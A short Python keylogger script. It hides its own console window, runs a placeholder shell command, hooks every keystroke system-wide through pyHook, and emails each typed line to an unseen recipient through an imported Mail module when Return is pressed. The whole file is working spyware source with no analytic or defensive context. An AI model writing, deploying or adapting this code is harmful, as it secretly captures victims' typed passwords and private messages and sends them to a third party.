# coding:utf-8
import subprocess
import pyHook
import pythoncom
import Mail
import ctypes

res=''

def onKeyboardEvent(event):
	print "Key:", event.Key
	global res
	if event.Key == "Return":
		Mail.sendsth(res)
		res = ''
	else:
		res += event.Key + ' '
	return True
	
def main():
	whnd = ctypes.windll.kernel32.GetConsoleWindow()  
	if whnd != 0:  
		ctypes.windll.user32.ShowWindow(whnd, 0)  
		ctypes.windll.kernel32.CloseHandle(whnd) 
	subprocess.call('some_command -some_arg', shell=True)
	hm = pyHook.HookManager()
	hm.KeyDown = onKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()

if __name__ == "__main__":
	main()